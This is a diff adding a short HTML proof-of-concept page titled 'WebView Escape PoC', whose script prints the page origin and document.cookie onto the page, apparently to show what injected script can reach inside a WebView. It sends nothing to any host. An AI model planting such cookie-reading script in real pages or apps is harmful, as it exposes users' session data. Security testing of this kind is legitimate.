@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>WebView Escape PoC</h1>
+
+<script>
+document.body.innerHTML += "<p>Origin: " + location.origin + "</p>";
+document.body.innerHTML += "<p>Cookies: " + document.cookie + "</p>";
+</script>
+
+</body>
+</html>
